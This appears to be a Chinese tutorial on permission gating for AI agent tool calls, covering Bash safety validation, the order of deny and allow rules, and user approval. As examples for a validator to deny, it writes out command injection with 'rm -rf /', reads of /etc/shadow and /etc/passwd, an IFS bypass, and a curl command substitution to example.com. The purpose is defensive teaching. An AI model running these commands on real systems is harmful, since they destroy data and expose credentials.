# 1. 模型返回的是建议，不是最终执行权 {#gate}
<!-- tag: intercept -->

早期章节中，模型返回 tool use block 后，系统会直接调用对应工具。权限系统加入后，中间插入一个检查步骤：`permission.check(tool_name, tool_input)`。只有返回 allow，工具才真正执行；返回 deny 时把拒绝原因写回工具结果；返回 ask 时等待用户选择。

这非常重要。LLM 可能提出危险命令、误操作或与当前模式不符的写操作。权限系统把“模型建议”变成“需要经过安全关的行动请求”。

最小权限原则是这页的底层边界：默认只给完成当前任务所需的最低权限，读操作、写操作、执行命令、联网访问应分别授权。不要把“这个 Agent 大概可信”当成全局放行理由。

核心拦截：执行工具前先检查权限Python

```text
for tool_call in tool_uses:
 decision = permissions.check(tool_call.name, tool_call.input)

 if decision["behavior"] == "deny":
 output = f"Permission denied: {decision['reason']}"
 elif decision["behavior"] == "ask":
 approved = permissions.ask_user(tool_call.name, tool_call.input)
 output = run_tool(tool_call) if approved else "Denied by user"
 else:
 output = run_tool(tool_call)
```

你现在应该能做什么：看到 tool use block 时，不再默认“模型说了就执行”，而是先问这条行动有没有执行权。

# 2. Bash 必须特殊照顾，因为它几乎什么都能做 {#bash}
<!-- tag: bash safety -->

视频里强调 Bash 很危险：它可以读写文件、删除目录、执行脚本、提权、拼接命令、做命令替换。权限系统先用 `BashSecurityValidator` 检查命令字符串，只要命中危险模式，就直接 deny。

危险模式直觉风险

shell metacharacters`;`、`&&`、`|` 等拼接命令注入或连带执行。
`sudo`提权执行越权修改系统。
`rm -rf`递归强删删除目录和大量文件。
command substitution`$(...)` 或反引号隐藏执行额外命令。
IFS manipulation利用 shell 分隔符绕过简单过滤，形成注入。

危险示例：Bash 命令注入Deny

```text
ls; rm -rf /
sudo cat /etc/shadow
cat${IFS}/etc/passwd
echo $(curl http://example.com/script.sh)
```

静态模式只能挡住一部分危险。更稳的 Bash 策略还会解析命令意图：是否只读、是否写入当前工作区、是否跨目录、是否下载并执行远程脚本、是否使用管道隐藏副作用。工具名相同，风险等级可能完全不同。

你现在应该能做什么：解释为什么 Bash 不能只按工具名放行，而要检查具体 command 内容。

# 3. 决策顺序：先拒绝，再看模式，再允许，最后询问 {#rules}
<!-- tag: decision order -->

`PermissionManager.check` 的顺序很关键。它先看 Bash 安全校验和 deny rules，只要危险就立即拒绝。然后看当前 mode：plan 模式会阻止写操作，auto 模式会自动允许读操作。再看 allow rules，最后才 ask user。

default: bash dir
always后
plan: write
danger: rm


default 模式
说明会显示在这里。
1. Bash 安全校验
2. deny rules
3. mode 判断
4. allow rules
5. ask user
顺序很重要：危险命令必须先拒绝，不能因为后面有宽松 allow rule 而放行。

默认规则示例：deny 优先，读文件允许JSON

```text
[
 {"tool": "bash", "content": "rm -rf /", "behavior": "deny"},
 {"tool": "bash", "content": "sudo *", "behavior": "deny"},
 {"tool": "read_file", "path": "*", "behavior": "allow"}
]
```

`/mode` 可以切换模式，`/rules` 可以查看当前运行时规则。用户选择 always 后，会追加一条 allow rule，因此下一轮同类命令可以不再询问。

Worked example：一次写文件请求如何决策Flow

```text
tool_call:
 name = "write_file"
 input.path = "src/config.json"

决策顺序：
 1. 不是 Bash，跳过 Bash 字符串校验。
 2. 检查 deny rules：路径是否在禁止区，如 /etc 或 secrets。
 3. 检查 mode：plan mode 下写操作直接 ask 或 deny。
 4. 检查 allow rules：是否允许写入 src/*.json。
 5. 若仍不确定，询问用户本次 yes/no/always。

输出：
 allow -> 执行工具
 deny -> 把拒绝原因作为 tool_result 回填
 ask -> 等用户审批后再继续
```

# 4. 用户审批：yes、no、always 与连续拒绝 {#ask}
<!-- tag: ask user -->

当某条工具调用既不命中 deny，也不命中 allow，就进入 ask。用户可以选择 yes、no 或 always。yes 只允许本次执行；always 会把当前工具模式追加到规则里；no 会拒绝并增加连续拒绝计数。

yes本次允许，执行工具，连续拒绝计数清零。
always追加 allow rule，后续同类工具调用可自动放行。
no本次拒绝，连续拒绝计数增加。多次拒绝后提示切到 plan mode。

连续拒绝是一个有趣的 Harness 信号：如果用户一直拒绝写操作，说明模型当前行动方向不对。系统可以提示切换到 plan mode，让 Agent 先解释计划，减少继续乱调用工具。

always 也要有边界。更安全的实现会把 always 绑定到工具名、参数模式和当前工作区，而不是永久允许所有同名工具。否则一次“允许列目录”可能被扩大成“允许任意 Bash”。

# 5. 常见误区：权限系统不是一个弹窗而已 {#pitfall}
<!-- tag: pitfalls -->

权限系统不只是“执行前问用户一下”。它包含静态危险模式识别、规则匹配、模式策略、用户审批、运行时规则更新和拒绝反馈。真正成熟的系统还会加入路径白名单、dry run、审计日志、可配置策略和恢复机制。

错误示例：只看工具名，不看参数危险

```text
if tool_name == "bash":
 run_tool(tool_input)

# 问题：bash ls 和 bash rm -rf / 都会被同样放行。
# 权限系统必须检查 command 内容。
```

## box warn
### 太宽松
所有 Bash 自动允许，模型一次错误命令就可能造成真实破坏。

## box warn
### 太粗糙
所有 Bash 全部拒绝，Agent 无法完成正常读取、列目录和诊断任务。

更好的权限系统应该在“能做事”和“安全可控”之间分层：读操作可以更宽松，写操作要谨慎，危险模式直接拒绝，高风险操作需要审批。

公开项目里的可审计权限系统至少应记录：请求时间、工具名、关键参数、命中规则、决策结果、用户选择、执行结果和错误摘要。这样安全问题发生后，才能回溯分析是规则太宽、模型误判，还是工具实现本身有缺陷。
